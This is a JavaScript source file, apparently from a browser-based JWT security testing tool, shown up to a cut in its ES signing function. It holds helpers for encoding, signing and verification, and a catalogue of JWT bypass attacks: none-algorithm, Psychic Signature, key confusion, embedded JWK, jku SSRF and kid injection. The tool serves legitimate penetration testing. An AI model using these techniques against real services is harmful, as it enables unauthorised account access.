// ====================== Not Yet Sorted


// ====================== Classes
class TestCase {
    static counter = 1;
    constructor({ description, variantName, originalToken, testToken, originalReadable, testReadable, vulnerability }) {
        this._validateVulnerability(vulnerability);
        this.testId = TestCase.counter++;
        this.description = description;
        this.variantName = variantName;
        this.originalToken = originalToken;
        this.testToken = testToken;
        this.originalReadable = originalReadable;
        this.testReadable = testReadable;
        this.vulnerability = vulnerability;
    }
    static resetCounter() {
        TestCase.counter = 1;
    }
    _validateVulnerability(vuln) {
        if (vuln === null) return;
        if (typeof vuln !== "object") {
            throw new Error("Vulnerability must be an object.");
        }

        const requiredKeys = ["name", "cve", "description", "token_amount"];
        for (const key of requiredKeys) {
            if (!(key in vuln)) {
                throw new Error(`Vulnerability missing required key: ${key}`);
            }
        }

        if (typeof vuln.name !== "string" || typeof vuln.description !== "string") {
            throw new Error("Vulnerability fields must be of type string (except 'cve').");
        }
    }

}
// ====================== Globals
const ESCAPE_SEQUENZ = "/#";
const _alg_converter = { "PBES2-HS256+A128KW": "SHA-256", "PBES2-HS384+A192KW": "SHA-384", "PBES2-HS512+A256KW": "SHA-512", "RSA-OAEP": "SHA-1", "RSA-OAEP-256": "SHA-256", "A128CBC-HS256": "AES-CBC", "A192CBC-HS384": "AES-CBC", "A256CBC-HS512": "AES-CBC", "A128GCM": "AES-GCM", "A192GCM": "AES-GCM", "A256GCM": "AES-GCM", "PS256": "SHA-256", "PS384": "SHA-384", "PS512": "SHA-512", "ES256": ["SHA-256", "P-256"], "ES384": ["SHA-384", "P-384"], "ES512": ["SHA-512", "P-521"], "HS256": "SHA-256", "HS384": "SHA-384", "HS512": "SHA-512", "RS256": "SHA-256", "RS384": "SHA-384", "RS512": "SHA-512" };
const _jwe_algorithm_to_key_length = {
    "A128KW": 16,
    "A192KW": 24,
    "A256KW": 32,
    "A128GCMKW": 16,
    "A192GCMKW": 24,
    "A256GCMKW": 32,
    "PBES2-HS256+A128KW": 32,
    "PBES2-HS384+A192KW": 48,
    "PBES2-HS512+A256KW": 64
}
var isJWTView = true;
var isKeyMgmtView = false;
var isJWEView = false;
var isAttacksView = false;
/** @type {object}
 * * Vulnerabilities object containing various vulnerabilities and their details
 * @property {string} name - Name of the vulnerability
 * @property {string} cve - Common Vulnerabilities and Exposures (CVE) identifier
 * @property {string} description - Description of the vulnerability
 * @property {number} token_amount - Number of tokens generated
 *
 * */
const vulnerabilities = {
    SignatureExclusion: {
        name: 'Signature Exclusion',
        cve: 'CVE-2020-28042',
        description: 'Sending the token without signature.',
        token_amount: 1
    },
    NoneAlg: {
        name: "None Algorithm Attack",
        cve: "CVE-2015-9235, CVE-2022-23540",
        description: "Try to bypass the signature check by using the none algorithm. This attack is possible if the server only blacklists some 'none' algorithms cases. The server should check the alg field and reject all none algorithms.",
        token_amount: 16
    },
    PsychicSignature: {
        name: "Psychic Signature in Java",
        cve: "CVE-2022-21449",
        description: "Exploits a vulnerability in Java 15–18 (CVE-2022-21449, 'Psychic Signatures') where ECDSA signatures weren't properly verified. Allows bypassing JWT verification by replacing the signature with MAYCAQACAQA",
        token_amount: 1
    },
    EmptyKey: {
        name: "Empty Key Attack",
        cve: "CVE-2019-20933",
        description: "Signing the token via HSxxx with a empty key \\x00 / AA==.",
        token_amount: 3
    },
    WeakHMACKey: {
        name: "Weak HMAC Key Attack",
        cve: "CVE-2019-20933",
        description: "Bruteforcing the HMAC key with a list of default secrets. This attack is possible if the server uses weak or default HMAC keys for signing JWTs.",
        token_amount: 1
    },
    SSRF: {
        name: 'Server-Side Request Forgery (SSRF)',
        cve: 'N/A',
        description: 'Test the jku/x5u header for SSRF vulnerability. If the server implement this feature without validating the URL, an attacker can exploit SSRF.',
        token_amount: 4
    },
    CustomKey: {
        name: "Custom Key Attack / Public Key Injection via embedded JWK",
        cve: "CVE-2018-0114",
        description: "Abuses JWT implementations that accept and trust an embedded 'jwk' object directly in the JWT header. An attacker can generate their own key pair, embed the public key in the 'jwk' field, and sign the token with the corresponding private key, or leave the key empty to use the hardcoded keys.",
        token_amount: 1
    },
    KeyConfusion: {
        name: "Key Confusion / Algorithm Confusion Attack (RSA/EC Public Key used as HMAC key)",
        cve: "CVE-2015-9235",
        description: "Abuses JWT implementations that accept asymmetric algorithms (e.g., RS256, ES256) and incorrectly trust the algorithm field in the JWT header. An attacker can modify the algorithm to HS256 and use the public RSA/EC key as a symmetric HMAC key, bypassing signature validation and enabling unauthorized access.",
        token_amount: 11 * 3
    },
    Kid: {
        name: "Kid Attacks",
        cve: "N/A",
        description: "Attacks that abuse the 'kid' field in the JWT header. This field is used to identify the key used to sign the token. An attacker can manipulate the 'kid' field to use a different key than intended, bypassing signature validation. This can work with different attack vectors like LFI, Command Injection, SQLi etc. Nine PoC payloads are already included. An attacker can also use a custom payload list.",
        token_amount: 9
    }
}

// #region ====================== Helper Functions

/**
 * Fetches a JWK from a given URL and returns the keys array.
 *
 * @param {string} jwkUrl
 * @return {Promise<Array>} Promise that resolves to an array of JWKs
 * @throws {Error} If the fetch fails or the JWK format is invalid
 */
async function fetchJwkFromUrl(jwkUrl) {
    try {
        const response = await fetch(jwkUrl, {
            headers: {
                'Accept': 'application/json'
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const jwkData = await response.json();

        if (!jwkData.keys || !Array.isArray(jwkData.keys)) {
            throw new Error('Invalid JWK format: "keys" property missing or malformed');
        }

        return jwkData.keys; // array of JWKs
    } catch (error) {
        console.error('Failed to fetch or parse JWK:', error);
        throw error;
    }
}

/**
 * Parses a Kid Custom Payload String and returns the parsed content.
 * The String should contain kid_payload - expected_key pairs separated by semicolons.
 * The expected key is optional and can be empty.
 * String should look like this:
 * kid_payload;[expected_key(Base64)]
 * foo;bar
 * abc;123
 * xyz
 * into an array of dictionaries
 * @param {String} content - e.g. abc;xyz\nfoo;bar\n123
 * @return {Array<{kid_payload: string, expected_key: string(Base64)}>}
 */
function parsePayloadContentForKid(content, delimitor = ';') {
    return content
        .split('\n')
        .map(line => line.trim())
        .filter(line => line)
        .map((line, index) => {
            const seperatorIndex = line.indexOf(delimitor)
            if (seperatorIndex === -1) {
                console.debug(`Line ${index + 1}: No seperator found -> use whole line as payload `)
                return {
                    payload: line,
                    key: undefined
                }
            }
            const payload = line.substring(0, seperatorIndex)
            const key = line.substring(seperatorIndex + 1)

            return {
                payload: payload,
                key: key || undefined
            }
        })
}

/**
 * Generates a random ASCII string of the specified length.
 *
 * @param {Number} length
 * @return {string} - A random ASCII string of the specified length.
 */
function randomAsciiString(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        // ASCII 33 (!) bis 126 (~), also druckbare Zeichen
        result += String.fromCharCode(Math.floor(Math.random() * (126 - 33 + 1)) + 33);
    }
    return result;
}

/**
 * Asserts that a condition is true, throws an error with a message if it is not.
 *
 * @param {*} condition - The condition to check.
 * @param {string} [message="Assertion failed"] - The error message to throw if the condition is false.
 * @throws {Error} If the condition is false, an error is thrown with the provided message.
 */
function assert(condition, message = "Assertion failed") {
    if (!condition) {
        throw new Error(message);
    }
}

/**
 * Compares two Uint8Arrays for equality.
 *
 *
 * @param {Uint8Array} a
 * @param {Uint8Array} b
 * @return {boolean} true if the arrays are equal, false otherwise.
 */
function areUint8ArraysEqual(a, b) {
    assert(a instanceof Uint8Array && b instanceof Uint8Array, "Both arguments must be Uint8Arrays");
    if (a.length !== b.length) return false;
    for (let i = 0; i < a.length; i++) {
        if (a[i] !== b[i]) return false;
    }
    return true;
}

/**
 * Converts a Base64 string to a Uint8Array.
 * Wrapper function for base64urlToUint8Array.
 *
 * @param {string} base64
 * @return {Uint8Array} Uint8Array representation of the Base64 string.
 */
function base64ToUint8Array(base64) {
    return base64urlToUint8Array(base64_to_URL(base64));
}

/**
 * Unescapes custom JSON keys in a string.
 * This function removes the custom escape sequence ESCAPE_SEQUENCE.
 * {"foo": "bar", "\#foo": "123"} -> {"foo": "bar", "foo": "123"}
 *
 * @param {string} jsonString - The JSON string to unescape.
 * @return {string} The unescaped JSON string.
 */
function unescapeCustomJsonKeys(jsonString, skip = false) {
    // TODO: This is crazy bad coding. For a better solution, all attack functions need to refactored to return duplicate header tokens and the unescapeFunction should be called in the generateToken function.
    if (skip) return jsonString;
    const regex = new RegExp(`"${ESCAPE_SEQUENZ}([^"]*)"`, 'g');
    jsonString = jsonString.replace(regex, '"$1"');
    return jsonString;
}

/**
 * Beautifies the JWT header and body in the input fields.
 *
 */
function beautifyJWT() {
    document.getElementById("decodedHeader").value = JSON_Beautify_But_Way_Cooler(document.getElementById("decodedHeader").value, 4);
    document.getElementById("decodedBody").value = JSON_Beautify_But_Way_Cooler(document.getElementById("decodedBody").value, 4);
}

/**
 * Unbeautifies the JWT header and body in the input fields.
 *
 */
function unbeautifyJWT() {
    document.getElementById("decodedHeader").value = unbeautifyJson(document.getElementById("decodedHeader").value);
    document.getElementById("decodedBody").value = unbeautifyJson(document.getElementById("decodedBody").value);
}

/**
 * This function removes all newlines and spaces from a JSON string.
 *
 * @param {string} jsonString - The JSON string to be unbeautified.
 * @return {string} The JSON string without newlines and spaces.
 */
function unbeautifyJson(jsonString) {
    jsonString = jsonString.replace(/\n */g, '').replace(/^ */g, '').replace(/ *$/g, '').replace(/:\s*/g, ':')
    const tmp = replaceCustomByteEscapeSequences(jsonString);
    console.debug("handleJSONForTokenEncoding:", tmp);
    return tmp
}

/**
 * Beautifies a JSON string by adding indentation and newlines. Since it is so simple it also accepts invalid JSON.
 *
 * @param {string} string - The JSON string to be beautified.
 * @param {number} [indent=4] - The number of spaces to use for indentation (default is 4).
 * @return {string} The beautified JSON string.
 */
function JSON_Beautify_But_Way_Cooler(string, indent = 4) {
    // rudimentary beautifier
    let depth = 0;
    let result = ""
    string = unbeautifyJson(string);
    for (let char of string) {
        if (char === '{' || char === '[') {
            depth++;
            result += char + "\n" + " ".repeat(Math.max(depth * indent, 0));
        } else if (char === '}' || char === ']') {
            depth--;
            result += '\n' + " ".repeat(Math.max(depth * indent, 0)) + char;
        }
        else if (char === ',') {
            result += char + "\n" + " ".repeat(Math.max(depth * indent, 0));
        } else if (char === ':') {
            result += char + " ";
        } else {
            result += char;
        }
    }
    return result
}

/**
 * Escapes unprintable bytes in a string with a custom escape sequence (\#xx).
 *
 * @param {string} str - String containing unprintable bytes.
 * @return {string} String with escaped unprintable bytes.
 */
function escapeUnprintableBytesWithCustomEscapeSequence(str) {
    console.debug("escapeUnprintableBytesWithCustomEscapeSequence:", str);
    return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F\x81\x8D\x8F\x90\x9D\xA0\xAD]/g, (byte) => {
        const hex = byte.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase();
        console.debug("escapeUnprintableBytesWithCustomEscapeSequence: Found unprintable byte", byte, hex);
        return `${ESCAPE_SEQUENZ}${hex}`;
    });
}
/**
 * Replaces custom byte escape sequences \#xx in a string with their corresponding byte values.
 * @param {string} str - String containing custom byte escape sequences.
 * @return {string} - String with replaced byte values.
 */
function replaceCustomByteEscapeSequences(str) {
    console.debug("replaceCustomByteEscapeSequences:", str);
    const regex = new RegExp(`${ESCAPE_SEQUENZ}([0-9A-Fa-f]{2})`, 'g');
    if (str.match(regex)) console.debug("Found custom byte escape sequences");
    return str.replace(regex, (match, hex) => {
        return String.fromCharCode(parseInt(hex, 16));
    });
}

/**
 * Prints a title with a decorative line above and below it
*
* @param {string} title
* @param {string} [char="="]
*/
function prettyPrintTitle(title, char = "=") {
    const line = char.repeat(title.length);
    console.log(`\n${line}\n${title}\n${line}\n`);
}

/**
 * Prints a title centered within a specified width
 *
 * @param {string} title
 * @param {number} [width=50]
 * @param {string} [char="="]
 */
function prettyPrintCenter(title, width = 50, char = "=") {
    const padding = Math.max(0, width - title.length);
    const left = Math.floor(padding / 2);
    const right = padding - left;
    console.log(`${char.repeat(left)} ${title} ${char.repeat(right)}`);
}

/**
 * Checks if a string is a valid Base64 URL encoded string
 *
 * @param {string} str
 * @return {boolean}
 */
function isBase64Url(str) {
    return /^[A-Za-z0-9\-_]+={0,2}$/.test(str);
}

/**
 * Checks if a string is a valid JWT (JSON Web Token)
 *
 * @param {string} token
 * @return {boolean}
 */
function isValidJWT(token) {
    return /^[A-Za-z0-9\-_]+={0,2}\.[A-Za-z0-9\-_]+={0,2}\.[A-Za-z0-9\-_]*={0,2}$/.test(token);
}
/**
 * Checks if jwe is a valid JWE (JSON Web Encryption) string
 *
 * @param {string} jwe
 * @return {boolean}
 */
function isValidJWE(jwe) {
    return /^[A-Za-z0-9\-_]+={0,2}\.(?:[A-Za-z0-9\-_]+={0,2})?\.[A-Za-z0-9\-_]*={0,2}\.[A-Za-z0-9\-_]*={0,2}\.[A-Za-z0-9\-_]*={0,2}$/.test(jwe);
}
/**
 * Converts a Base64 string to Base64 URL format
 *
 * @param {string} str
 * @return {string}
 */
function base64_to_URL(str) {
    return str.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

/**
 * Converts a Base64 URL string to Base64 format
 *
 * @param {string} str
 * @return {string}
 */
function URL_to_base64(str) {
    if (str.length % 4 === 0) {
        var padding = "";
    }
    else {
        var padding = '='.repeat(4 - (str.length % 4));
    }
    return str.replace(/-/g, '+').replace(/_/g, '/') + padding;
}

/**
 * Encodes a binary string to Base64 URL format
 *
 * @param {string} str
 * @return {string}
 */
function b64URLencode(str) {
    return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

/**
 * Decodes a Base64 URL string to a binary string
 *
 * @param {string} str
 * @return {string}
 */
function b64URLdecode(str) {
    const b64encoded = str.replace(/-/g, '+').replace(/_/g, '/');
    if (str.length % 4 === 0) {
        var padding = "";
    }
    else {
        var padding = '='.repeat(4 - (str.length % 4));
    }
    return atob(b64encoded + padding);
}

/**
 * Extracts the public components from a JWK (JSON Web Key). Returns null if the input is not a valid JWK.
 *
 * @param {object} jwk
 * @return {object|null} object(public_jwk)
 */
function extractPublicJwk(jwk) {
    if (!jwk || typeof jwk !== 'object') return null;
    const publicJwk = { ...jwk };
    // remove private components
    switch (jwk.kty) {
        case 'RSA':
            delete publicJwk.d;
            delete publicJwk.p;
            delete publicJwk.q;
            delete publicJwk.dp;
            delete publicJwk.dq;
            delete publicJwk.qi;
            delete publicJwk.oth;
            break;
        case 'EC':
            // ECDSA
            delete publicJwk.d;
            break;
        case 'OKP':
            // EdDSA (Ed25519, Ed448)
            delete publicJwk.d;
            break;
    }
    return publicJwk;
}

/**
 * Decodes a key string (PEM -> Uint8Array or JWK -> object) for crypto.subtle.importKey. Return null if the input is not a valid key string or JSON parse fails.
 *
 * @param {string} keyString: PEM or JWK string
 * @param {boolean} isPublicKey
 * @return {Uint8Array|object|null} Uint8Array(PEM) or object(JWK) or null
 */
function decodeKey(keyString, isPublicKey) {
    if (typeof keyString !== "string") {
        console.error("decodeKey: keyString is not a string");
        return null;
    }

    keyString = keyString.trim();
    // PEM format
    if (/-----BEGIN (?:PUBLIC|PRIVATE) KEY-----/.test(keyString)) {
        const base64 = keyString.replace(/-----(BEGIN|END) [A-Z ]+-----/g, "").replace(/\s+/g, "");
        return Uint8Array.from(atob(base64), c => c.charCodeAt(0));
    }
    // JWK format
    else if (keyString.startsWith("{") && keyString.endsWith("}")) {
        try {
            const parsed = JSON.parse(keyString);
            if ('kty' in parsed) {
                return isPublicKey ? extractPublicJwk(parsed) : parsed
            }
        }
        catch (e) {
            console.error("decodeKey: JSON parse failed", e)
            return null;
        }
    }
}

/**
 * Converts an ArrayBuffer to a Base64 URL encoded string
 *
 * @param {arrayBuffer} arrayBuffer
 * @return {string} Base64 URL encoded string
 */
function arrayBufferToBase64Url(arrayBuffer) {
    // quite messy but this was neccesary because I didn't understood the difference between ArrayBuffer and Uint8Array at the time
    return Uint8ArrayTobase64Url(arrayBuffer);
}

/**
 * Converts a Uint8Array to a Base64 URL encoded string
 *
 * @param {Uint8Array} array
 * @return {string} Base64 URL encoded string
 */
function Uint8ArrayTobase64Url(array) {
    if ((array instanceof ArrayBuffer)) { // Nothing to see here
        array = new Uint8Array(array);
    }
    return btoa(String.fromCharCode(...array)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

/**
 * takes base64url encoded string and converts it to Uint8Array :O
 * neccesary for the signature
 *
 * @param {string} str Base64 URL encoded string
 * @return {Uint8Array| null} Uint8Array or null if malformed
 */
function base64urlToUint8Array(str) {
    /**
     * takes base64url encoded string and converts it to Uint8Array :O
     * Needed for the signature
     * returns array or NULL if malformed b64
     */
    if (!str) {
        console.error("base64urlToUint8Array: empty string");
        return null;
    }
    else if (!isBase64Url(str)) {
        console.error("base64urlToUint8Array: not a valid base64url string");
        return null;
    }
    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
    if (str.length % 4 === 0) {
        var padding = "";
    }
    else {
        var padding = '='.repeat(4 - (str.length % 4));
    }
    try {
        const raw = atob(base64 + padding);
        return new Uint8Array([...raw].map(c => c.charCodeAt(0)));
    }
    catch (e) {
        console.error("Malformed b64", e);
        return null;
    }
}

/**
 * Converts a hex string to a Uint8Array
 *
 * @param {string} hexString
 * @throws {Error} if the hex string is uneven
 * @return {Uint8Array}
 */
function hexToUint8Array(hexString) {
    if (hexString.length % 2 !== 0) {
        console.error("Uneven Hex");
        throw new Error("uneven hex");
    }
    const bytes = new Uint8Array(hexString.length / 2);
    for (let i = 0; i < bytes.length; i++) {
        bytes[i] = parseInt(hexString.substr(i * 2, 2), 16);
    }
    return bytes;
}
// #endregion ====================== End of Helper Functions

// #region ====================== JWT Functions

/**
 * This function handles the right encoding of the JSON string. It removes all newlines and hopefully all spaces that are unnecessary.
 *
 * @param {string} jsonString
 * @return {string} The JSON without newlines and spaces.
 * @description Since this function needs to deal with invalid JSON aswell, it is a bit tricky to remove whitespaces.
*/
function handleJSONForTokenEncoding(jsonString) {
    // contentType = 'Valid JSON' | 'Invalid JSON' | 'Raw Text'
    const contentType = document.getElementById("contentTypeOfJSON").value;
    if (contentType === 'Valid JSON') {
        return JSON.stringify(JSON.parse(jsonString));
    }

    // /*
    //  else if (contentType === 'Invalid JSON') {

    //     //  *
    //     //  * remove all newlines and spaces leads to stuff like name: "John Doe" -> name:"JohnDoe"
    //     //  * which is pretty bad
    //     //  * Since it is not garanted that every string has a closing "quote
    //     //  * we cant just take every white space except in those in quotes
    //     //  * so here some rules which hopefully cover all cases
    //     //  * Remove all newlines and all spaces adjacent
    //     //  * Remove all spaces at the beginning and end of the string
    //     //  * Remove all spaces after a colon
    //    //? Am i missing a rule?
    //    jsonString = jsonString.replace(/\n */g, '').replace(/^ */g, '').replace(/ *$/g, '').replace(/: /g, ':')
    //    const tmp = replaceCustomByteEscapeSequences(jsonString);
    //    console.debug("handleJSONForTokenEncoding:",tmp);
    //    return tmp
    // }
    else if (contentType === 'Raw Text') {
        return replaceCustomByteEscapeSequences(jsonString);
    }
}

/**
 * This function handles the "parsing"/beautifying of the JSON string.
 *
 *
 * @param {string} jsonString - The JSON string to be parsed.
 * @param {number} [indent=4] - The number of spaces to use for indentation (default is 4).
 * @return {string} The beatified JSON string.
 * @description This function handles the "parsing"/beautifying of the JSON string.
 * Since invalid JSON needs to be handled aswell, this function can deal with Valid JSON, Invalid JSON and Raw Text.
 * Which mode is used is determined by the contentTypeOfJSON Element.
 * It uses JSON.stringify to parse valid JSON and a custom function to beautify invalid JSON.
 */
function handleJSONForTokenDecoding(jsonString, indent = 4) {
    // contentType = 'Valid JSON' | 'Invalid JSON' | 'Raw Text'
    const contentType = document.getElementById("contentTypeOfJSON").value;
    if (contentType === 'Valid JSON') {
        return JSON.stringify(JSON.parse(jsonString), null, indent);
    }
    else if (contentType === 'Invalid JSON') {
        return escapeUnprintableBytesWithCustomEscapeSequence(JSON_Beautify_But_Way_Cooler(jsonString, indent));
    }
    else if (contentType === 'Raw Text') {
        return escapeUnprintableBytesWithCustomEscapeSequence(jsonString);
    }
}

/**
 * Decodes a JWT token and displays the decoded header and body in the respective input fields.
 *
 * @return {void}
 * @description This function handles the whole decoding process of the JWT token.
 * It takes the JWT from the input field ("token"), splits it into header, body, and signature,
 * decodes the header and body, and displays them in the respective input fields.
 * If the token is invalid, it displays an error message.
 */
function decodeToken() {
    document.getElementById("jwtErrorMessage").innerText = "";
    const token = document.getElementById("token").value;
    if (!(isValidJWT(token))) {
        jwt_error_message("Bad Token");
        return;
    }
    document.getElementById("jwtErrorMessage").innerText = "";
    const token_parts = token.split(".");
    try {
        document.getElementById("decodedHeader").value = handleJSONForTokenDecoding(b64URLdecode(token_parts[0]), 4);
        document.getElementById("decodedBody").value = handleJSONForTokenDecoding(b64URLdecode(token_parts[1]), 4);
        autoResize(document.getElementById("decodedHeader"));
        autoResize(document.getElementById("decodedBody"));
    }
    catch (e) {
        jwt_error_message(e);

    }
}

/**
 * Encodes the JWT token by signing it with the specified algorithm and private key.
 *
 * @param {boolean} [triggeredByButton=false]
 * @return {Promise<void>}
 * @description This function handles the encoding process of the JWT token.
 * It takes the decoded header and body from the input fields,
 * encodes them to Base64URL format, and signs the token using the specified algorithm and private key.
 * If the token is successfully signed, it updates the token input field with the new token.
 * If the signing fails, it displays an error message.
 * Since there is a checkbox for auto signing, this function checks if the checkbox is checked
 * or if the function was triggered by a button click (triggeredByButton)
 * before proceeding with the signing process in the case that the old signature should be kept.
 */
async function encodeToken(triggeredByButton = false) {
    // Try to encode the Header and Body from the input fields
    document.getElementById("jwtErrorMessage").innerText = "";
    try {
        var header = b64URLencode(handleJSONForTokenEncoding(document.getElementById("decodedHeader").value));
    }
    catch (e) {
        jwt_error_message(e);
        document.getElementById("token").value = "";
        return;
    }
    try {
        var body = b64URLencode(handleJSONForTokenEncoding(document.getElementById("decodedBody").value));
    }
    catch (e) {
        jwt_error_message(e);
        document.getElementById("token").value = "";
        return;
    }

    let signature = "";
    // Check if the token should be signed (triggered by button or auto sign enabled)
    if ((triggeredByButton || document.getElementById("isAutoSignEnabled").checked)) {
        if ((document.getElementById('algorithm').value != "None")) {
            const alg = document.getElementById("algorithm").value;
            if (alg[0] === 'H') {
                signature = await signHS(header, body, alg);
            }
            else if (alg[0] === 'R') {
                signature = await signRS(header, body, alg);
            }
            else if (alg[0] === 'E') {
                signature = await signES(header, body, alg);
            }
            else if (alg[0] === 'P') {
                signature = await signPS(header, body, alg);
            }
        }
    }
    else {
        // If the token should not be signed, keep the old signature
        signature = document.getElementById("token").value.split(".")[2];
    }
    document.getElementById("token").value = header + "." + body + "." + signature;
    verifySignature(); // Since this function exists why not use it?
}

/**
 * Verifies the signature of a JWT using the specified algorithm and key.
 *
 * @return {Promise<boolean>} - Returns true if the signature is valid, false otherwise.
 * @description This function takes the JWT from the input field ("token").
 */
async function verifySignature() {
    const enc = new TextEncoder();

    // Read Token
    let signature = document.getElementById("token").value.split(".")[2];
    const token_value = document.getElementById("token").value.replace("." + signature, "");
    const alg = document.getElementById("algorithm").value;

    signature = base64urlToUint8Array(signature)
    try { // Read key from the right input field
        var key = (alg[0] == 'H') ? document.getElementById('key').value : document.getElementById('publicKey').value;
    }
    catch {
        key = "";
    }
    if (signature && token_value && alg && key) {

        if (alg[0] === 'H') { // symmetric key
            try { // import key
                const sym_key = await crypto.subtle.importKey(
                    "raw",
                    enc.encode(key),
                    { name: "HMAC", hash: _alg_converter[alg] },
                    false,
                    ["verify"]
                );
                // verify signature
                var valid = await crypto.subtle.verify(
                    { "name": "HMAC" },
                    sym_key,
                    signature,
                    enc.encode(token_value)
                )
                // reset Error message

            }
            catch (e) {
                // set Error message
                jwt_error_message("Key: " + e);
            }
        }
        else if (alg[0] === 'R') { // asymmetric key
            try { // import key
                // if key is PEM format, import as spki, else import as JWK
                const publicKey = await crypto.subtle.importKey(
                    key.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
                    decodeKey(key, isPublicKey = true),
                    { name: "RSASSA-PKCS1-v1_5", hash: _alg_converter[alg] },
                    true,
                    ["verify"]
                );
                // verify signature
                // RSASSA-PKCS1-v1_5 is the default algorithm for RS256, RS384, RS512
                var valid = await crypto.subtle.verify(
                    { "name": "RSASSA-PKCS1-v1_5" },
                    publicKey,
                    signature,
                    enc.encode(token_value)
                );

            }
            catch (e) {
                jwt_error_message("Public Key: " + e);
            }

        }
        else if (alg[0] === 'E') { // asymmetric key
            // ECDSA is the default algorithm for ES256, ES384, ES512
            try {
                // if key is PEM format, import as spki, else import as JWK
                const publicKey = await crypto.subtle.importKey(
                    key.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
                    decodeKey(key, isPublicKey = true),
                    { name: "ECDSA", namedCurve: _alg_converter[alg][1] },
                    false,
                    ["verify"]
                );
                // verify signature
                var valid = await crypto.subtle.verify(
                    {
                        name: "ECDSA",
                        hash: { name: _alg_converter[alg][0] }
                    },
                    publicKey,
                    signature,
                    enc.encode(token_value)
                );

            }
            catch (e) {
                jwt_error_message("Public Key:" + e);
            }
        }
        else if (alg[0] === 'P') { // asymmetric key
            // RSA-PSS is the default algorithm for PS256, PS384, PS512
            try {
                // import key
                // if key is PEM format, import as spki, else import as JWK
                const publicKey = await crypto.subtle.importKey(
                    key.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
                    decodeKey(key, isPublicKey = true),
                    { name: "RSA-PSS", hash: _alg_converter[alg] },
                    true,
                    ["verify"]
                );
                // verify signature
                var valid = await crypto.subtle.verify({
                    name: "RSA-PSS",
                    saltLength: _alg_converter[alg].split("-")[1] / 8 //PS256 -> 32 bit, 384 -> 48, 512 -> 64
                },
                    publicKey,
                    signature,
                    enc.encode(token_value)
                );

            }
            catch (e) {
                jwt_error_message("Public Key:" + e);
            }
        }

    }
    if (valid || alg === "none") { // TODO should None be valid or invalid?
        console.log("Signature is valid");
        document.getElementById("signatureIcon").src = "img/Signature_valid.svg";
        document.getElementById("signatureIcon").style.display = "block";
        document.getElementsByClassName("signature-heading")[0].style.backgroundColor = "#06A2B0";
        document.getElementById("signatureStatus").innerText = "valid";
        return true;
    }
    else {
        console.log("Signature is invalid");
        document.getElementById("signatureIcon").src = "img/Signature_invalid.svg";
        document.getElementById("signatureIcon").style.display = "block";
        document.getElementsByClassName("signature-heading")[0].style.backgroundColor = "#D90022";
        document.getElementById("signatureStatus").innerText = "invalid";
        return false;

    }
}

/**
 * Signs a JWT using the specified algorithm (RSxxx) and private key.
 *
 * @param {string} header - Base64URL: The JWT header to be signed.
 * @param {string} body - Base64URL: The JWT body to be signed.
 * @param {string} alg - The algorithm used for signing (e.g., RS256, RS384, RS512).
 * @param {string} [key=undefined] - The private key (RSA) used for signing (pkcs8 or JWK). If not provided, it will be generated.
 * @return {Promise<string|null>} - The signature as Base64URL string, or null if signing fails.
 */
async function signRS(header, body, alg, key = undefined) {
    // const _alg_converter = {"RS256":"SHA-256","RS384":"SHA-384","RS512":"SHA-512"};
    if (!(isBase64Url(header) || isBase64Url(body))) {
        console.error("signRS: invalid header or body");
        return null;
    }
    if (key && typeof key !== "string") {
        console.error("signRS: key is not a string");
        return null;
    }
    const encoder = new TextEncoder();
    // Check if the key is provided via function parameter
    if (!key) {
        // Check if the key is provided via input field if not generate a new keypair
        if (!(document.getElementById("privateKey").value)) {
            const keypair = await generateRSAKey();
            document.getElementById('privateKey').value = keypair[0];
            document.getElementById('publicKey').value = keypair[1];
            key = keypair[0];
        }
        else {
            key = document.getElementById("privateKey").value;
        }
    }

    try { // import key
        const privateKey = await crypto.subtle.importKey(
            key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
            decodeKey(key, isPublicKey = false),
            { name: "RSASSA-PKCS1-v1_5", hash: _alg_converter[alg] },
            true,
            ["sign"]
        );
        // sign the token (this time in one line)
        var signature = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", privateKey, encoder.encode(header + "." + body));
        return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));

    }
    catch (e) {
        jwt_error_message("Private Key: " + e);
    }
    return null;
}

/**
 * Signs a JWT using the specified algorithm (ESxxx) and private key.
 *
 * @param {string} header Base64URL: The JWT header to be signed.
 * @param {string} body  Base64URL: The JWT body to be signed.
 * @param {string} alg The algorithm used for signing (e.g., ES256, ES384, ES512).
 * @param {string} [key=undefined] private key (ECDSA) used for signing (pkcs8 or JWK). If not provided, it will be generated.
 * @return {Promise<string|null>} The signature as Base64URL string, or null if signing fails.
 */
async function signES(header, body, alg, key = undefined) {
    // const _alg_converter = {"ES256":["SHA-256","P-256"],"ES384":["SHA-384","P-384"],"ES512":["SHA-512","P-521"]};
    if (!(isBase64Url(header) || isBase64Url(body))) {
        console.error("signES: invalid header or body");
        return null;
    }
    if (key && typeof key !== "string") {
        console.error("signES: key is not a string");
        return null;
    }
    const encoder = new TextEncoder();
    const curve = _alg_converter[alg][1];
    console.log(_alg_converter[alg][1]);
    // check if key is provided via function parameter
    if (!key) {
        // check if key is provided via input field if not generate a new keypair
        if (!(document.getElementById("privateKey").value)) {
            const keypair = await generateECKey(curve);
            document.getElementById('privateKey').value = keypair[0];
            document.getElementById('publicKey').value = keypair[1];
            key = keypair[0];
        }
        else {
            key = document.getElementById("privateKey").value;
        }
    }

    try { // import key
        // if key is PEM format, import as pkcs8, else import as JWK
        const privateKey = await crypto.subtle.importKey(
            key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
            decodeKey(key, isPublicKey = false),
            { name: "ECDSA", namedCurve: _alg_converter[alg][1], },
            true,
            ["sign"]
        );
        // sign token
        var signature = await crypto.subtle.sign(
            {
                name: "ECDSA",
                hash: { name: _alg_converter[alg][0] }
            },
            privateKey,
            encoder.encode(header + "." + body)
        );
